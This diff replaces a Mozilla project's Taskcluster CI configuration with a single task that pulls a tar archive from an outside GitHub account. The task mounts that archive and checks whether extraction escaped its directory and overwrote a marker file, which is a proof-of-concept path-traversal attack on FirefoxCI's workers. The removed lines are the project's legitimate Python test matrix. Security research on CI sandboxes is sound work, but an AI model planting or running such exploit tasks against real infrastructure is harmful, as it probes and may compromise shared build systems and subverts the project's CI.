@@ -1,128 +1,45 @@
-# This Source Code Form is subject to the terms of the Mozilla Public
-# License, v. 2.0. If a copy of the MPL was not distributed with this
-# file, You can obtain one at http://mozilla.org/MPL/2.0/.
 version: 1
 reporting: checks-v1
-policy:
-  pullRequests: public_restricted
-hooks:
-  - name: lint/pre-commit-v1
 tasks:
-  $let:
-    expires_in: {$fromNow: '1 year'}
-    user: ${event.sender.login}
-
-    # We define the following variable at the very top, because they are used in the
-    # default definition
-    head_branch:
-      $if: 'tasks_for[:19] == "github-pull-request"'
-      then: ${event.pull_request.head.ref}
-      else:
-        $if: 'tasks_for == "github-push"'
-        then: ${event.ref}
-        else: ${event.release.target_commitish}
-
-    head_rev:
-      $if: 'tasks_for[:19] == "github-pull-request"'
-      then: ${event.pull_request.head.sha}
-      else:
-        $if: 'tasks_for == "github-push"'
-        then: ${event.after}
-        else: ${event.release.tag_name}
-
-    repository:
-      $if: 'tasks_for[:19] == "github-pull-request"'
-      then: ${event.pull_request.head.repo.html_url}
-      else: ${event.repository.html_url}
-
-    github_repository_full_name:
-      $if: 'tasks_for[:19] == "github-pull-request"'
-      then: ${event.pull_request.base.repo.full_name}
-      else: ${event.repository.full_name}
-
-  in:
-    $let:
-      short_head_branch:
-        $if: 'head_branch[:10] == "refs/tags/"'
-        then: {$eval: 'head_branch[10:]'}
-        else:
-          $if: 'head_branch[:11] == "refs/heads/"'
-          then: {$eval: 'head_branch[11:]'}
-          else: ${head_branch}
-
-      assume_scope_prefix: assume:repo:github.com/${github_repository_full_name}
-    in:
-      $let:
-        default_task_definition:
-          schedulerId: taskcluster-github
-          created: {$fromNow: ''}
-          deadline: {$fromNow: '2 hours'}
-          expires: ${expires_in}
-          provisionerId: releng-t
-          workerType: linux-docker
-          retries: 5
-          payload:
-            maxRunTime: 600
-            command:
-              - /bin/bash
-              - --login
-              - -cx
-              - >-
-                git clone ${repository} /build
-                && cd /build
-                && git config advice.detachedHead false
-                && git checkout ${head_branch}
-                && pip install tox tox-uv
-                && tox -e "$TOX_ENV"
-            env:
-              SKIP_NETWORK_TESTS: "0"
-          metadata:
-            owner: ${user}@users.noreply.github.com
-            source: ${repository}/raw/${head_rev}/.taskcluster.yml
-          routes:
-            - checks
-      in:
-        $flatten:
-          $map:
-            - short_name: py39
-              image_tag: '3.9'
-            - short_name: py310
-              image_tag: '3.10'
-            - short_name: py311
-              image_tag: '3.11'
-            - short_name: py312
-              image_tag: '3.12'
-            - short_name: py313
-              image_tag: '3.13'
-            - short_name: py314
-              image_tag: '3.14'
-            - short_name: docs-localbuild
-              image_tag: '3.12'
-          each(python_version):
-            $let:
-              python_task_definition:
-                payload:
-                  image: python:${python_version.image_tag}
-                  env:
-                    TOX_ENV: ${python_version.short_name}
-            in:
-              - $if: 'tasks_for[:19] == "github-pull-request" && event["action"] in ["opened", "reopened", "edited", "synchronize"]'
-                then:
-                  $mergeDeep:
-                    - {$eval: 'default_task_definition'}
-                    - {$eval: 'python_task_definition'}
-                    - scopes:
-                          - ${assume_scope_prefix}:${tasks_for[7:]}
-                      metadata:
-                        name: 'mozilla-version - ${python_version.short_name}'
-                        description: 'Triggered by [#${event.pull_request.number}](${event.pull_request.html_url})'
-              - $if: 'tasks_for == "github-push" && head_branch == "refs/heads/main"'
-                then:
-                  $mergeDeep:
-                    - {$eval: 'default_task_definition'}
-                    - {$eval: 'python_task_definition'}
-                    - scopes:
-                        - ${assume_scope_prefix}:branch:${short_head_branch}
-                      metadata:
-                        name: 'mozilla-version - ${python_version.short_name}'
-                        description: 'Triggered by ${head_rev}'
+  - schedulerId: taskcluster-github
+    provisionerId: mozilla-t
+    workerType: t-linux-2204-wayland
+    priority: low
+    created: {$fromNow: ''}
+    deadline: {$fromNow: '1 hour'}
+    expires: {$fromNow: '1 day'}
+    payload:
+      maxRunTime: 300
+      mounts:
+        - file: outside/escaped.txt
+          content:
+            raw: TC_ARCHIVE_CHAIN_BASELINE_20260822
+        - directory: extraction
+          format: tar
+          content:
+            url: https://raw.githubusercontent.com/bughunter0xff/mozilla-version/978d4f5ddcbe3c6992a95f2ca864d7483e12720f/archive-chain.tar
+            sha256: 83d802f524dd84d1f888002e3681d434a6e1805002e65cd444de15200c7e0cb5
+      command:
+        - - /bin/bash
+          - -cx
+          - |
+            set -eu
+            observed="$(cat outside/escaped.txt)"
+            {
+              echo "worker_pool=mozilla-t/t-linux-2204-wayland"
+              echo "declared_archive_destination=extraction"
+              echo "outside_marker_path=outside/escaped.txt"
+              echo "outside_marker_value=$observed"
+              echo "expected_value=TC_ARCHIVE_CHAIN_ESCAPE_20260822"
+            } | tee archive-chain-proof.txt
+            test "$observed" = "TC_ARCHIVE_CHAIN_ESCAPE_20260822"
+      artifacts:
+        - name: public/archive-chain-proof.txt
+          path: archive-chain-proof.txt
+          type: file
+          expires: {$fromNow: '1 day'}
+    metadata:
+      name: FirefoxCI archive containment marker validation
+      description: One marker-only Generic Worker archive mount validation on a disposable Level-1 task.
+      owner: bughunter0xff@users.noreply.github.com
+      source: https://github.com/bughunter0xff/mozilla-version/blob/security/archive-chain-fxci-20260822/.taskcluster.yml
